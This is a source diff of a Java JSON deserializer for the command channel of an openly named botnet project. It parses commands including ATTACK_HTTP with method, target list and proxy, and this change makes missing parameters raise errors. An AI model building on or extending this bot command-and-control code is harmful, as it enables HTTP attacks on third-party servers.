@@ -26,8 +26,7 @@
 
 package com.acmutv.botnet.core.command.json;
 
-import com.acmutv.botnet.config.AppConfigurationService;
-import com.acmutv.botnet.config.util.TemplateEngine;
+import com.acmutv.botnet.tool.string.TemplateEngine;
 import com.acmutv.botnet.core.attack.http.HttpAttackMethod;
 import com.acmutv.botnet.core.command.BotCommand;
 import com.acmutv.botnet.core.command.CommandScope;
@@ -48,7 +47,6 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
-import java.util.concurrent.TimeUnit;
 
 /**
  * This class realizes the JSON deserializer for {@link BotCommand}.
@@ -60,41 +58,6 @@ import java.util.concurrent.TimeUnit;
 public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
 
   private static final Logger LOGGER = LogManager.getLogger(BotCommandDeserializer.class);
-
-  /**
-   * Default resource for command `INIT`.
-   */
-  private static final String DEFAULT_INIT_RESOURCE = AppConfigurationService.getConfigurations().getInitResource();
-
-  /**
-   * Default settings for command `SET`.
-   */
-  private static final Map<String,String> DEFAULT_SET_SETTINGS = new HashMap<>();
-
-  /**
-   * Default timeout for command `SLEEP`.
-   */
-  private static final Duration DEFAULT_SLEEP_TIMEOUT = new Duration(60, TimeUnit.SECONDS);
-
-  /**
-   * Default timeout for command `SHUTDOWN`.
-   */
-  private static final Duration DEFAULT_SHUTDOWN_TIMEOUT = new Duration(60, TimeUnit.SECONDS);
-
-  /**
-   * Default method for command `ATTACK_HTTP`.
-   */
-  private static final HttpAttackMethod DEFAULT_ATTACK_HTTP_METHOD = HttpAttackMethod.GET;
-
-  /**
-   * Default targets for command `ATTACK_HTTP`.
-   */
-  private static final List<HttpTarget> DEFAULT_ATTACK_HTTP_TARGETS = new ArrayList<>();
-
-  /**
-   * Default proxy for command `ATTACK_HTTP`.
-   */
-  private static final HttpTargetProxy DEFAULT_ATTACK_HTTP_PROXY = null;
 
   /**
    * The singleton of {@link BotCommandDeserializer}.
@@ -125,63 +88,63 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
     JsonNode node = parser.getCodec().readTree(parser);
     LOGGER.trace("node={}", node);
 
-    BotCommand cmd = new BotCommand();
-
-    if (node.has("command")) {
-      final CommandScope scope = CommandScope.from(node.get("command").asText());
-      cmd.setScope(scope);
+    if (!node.has("command")) {
+      throw new IOException("Cannot read command scope (missing).");
     }
+
+    CommandScope scope;
+    try {
+      scope = CommandScope.valueOf(node.get("command").asText());
+    } catch (IllegalArgumentException exc) {
+      throw new IOException("Cannot read command scope (malformed).");
+    }
+
+    BotCommand cmd = new BotCommand(scope);
 
     if (cmd.getScope().isWithParams()) {
 
       switch (cmd.getScope()) {
 
-        case INIT:
-          final String resource = (node.has("resource")) ?
-              TemplateEngine.getInstance().replace(node.get("resource").asText())
-              :
-              DEFAULT_INIT_RESOURCE;
+        case RESTART:
+          if (!node.has("resource")) {
+            throw new IOException("Cannot read parameter [resource] for scope [RESTART] (missing)");
+          }
+          final String resource = TemplateEngine.getInstance().replace(node.get("resource").asText());
           cmd.getParams().put("resource", resource);
           break;
 
-        case SET:
-          final Map<String,String> settings = (node.has("settings")) ?
-              parseMapStringString(node.get("settings"))
-              :
-              DEFAULT_SET_SETTINGS;
+        case UPDATE:
+          if (!node.has("settings")) {
+            throw new IOException("Cannot read parameter [settings] for scope [UPDATE] (missing)");
+          }
+          final Map<String,String> settings = parseMapStringString(node.get("settings"));
           cmd.getParams().put("settings", settings);
           break;
 
         case SLEEP:
-          final Duration sleepTimeout = (node.has("timeout")) ?
-              parseObject(node.get("timeout"), Duration.class)
-              :
-              DEFAULT_SLEEP_TIMEOUT;
+          if (!node.has("timeout")) {
+            throw new IOException("Cannot read parameter [timeout] for scope [SLEEP] (missing)");
+          }
+          final Duration sleepTimeout = parseObject(node.get("timeout"), Duration.class);
           cmd.getParams().put("timeout", sleepTimeout);
           break;
 
         case SHUTDOWN:
-          final Duration shutdownTimeout = (node.has("timeout")) ?
-              parseObject(node.get("timeout"), Duration.class)
-              :
-              DEFAULT_SHUTDOWN_TIMEOUT;
+          if (!node.has("timeout")) {
+            throw new IOException("Cannot read command parameter [timeout] for scope [SHUTDOWN] (missing)");
+          }
+          final Duration shutdownTimeout = parseObject(node.get("timeout"), Duration.class);
           cmd.getParams().put("timeout", shutdownTimeout);
           break;
 
         case ATTACK_HTTP:
-          final HttpAttackMethod httpAttackMethod = (node.has("method")) ?
-              HttpAttackMethod.from(node.get("method").asText())
-              :
-              DEFAULT_ATTACK_HTTP_METHOD;
-          final List<HttpTarget> httpTargets = (node.has("targets")) ?
-              parseList(node.get("targets"), HttpTarget.class)
-              :
-              DEFAULT_ATTACK_HTTP_TARGETS;
+          if (!node.has("method") || !node.has("targets")) {
+            throw new IOException("Cannot read command parameters [methods,targets] for scope [ATTACK_HTTP] (missing)");
+          }
+          final HttpAttackMethod httpAttackMethod = HttpAttackMethod.from(node.get("method").asText());
+          final List<HttpTarget> httpTargets = parseList(node.get("targets"), HttpTarget.class);
           final HttpTargetProxy httpProxy = (node.has("proxy")) ?
-              parseObject(node.get("proxy"), HttpTargetProxy.class)
-              :
-              DEFAULT_ATTACK_HTTP_PROXY;
-
+              parseObject(node.get("proxy"), HttpTargetProxy.class) : null;
           cmd.getParams().put("method", httpAttackMethod);
           cmd.getParams().put("targets", httpTargets);
           cmd.getParams().put("proxy", httpProxy);
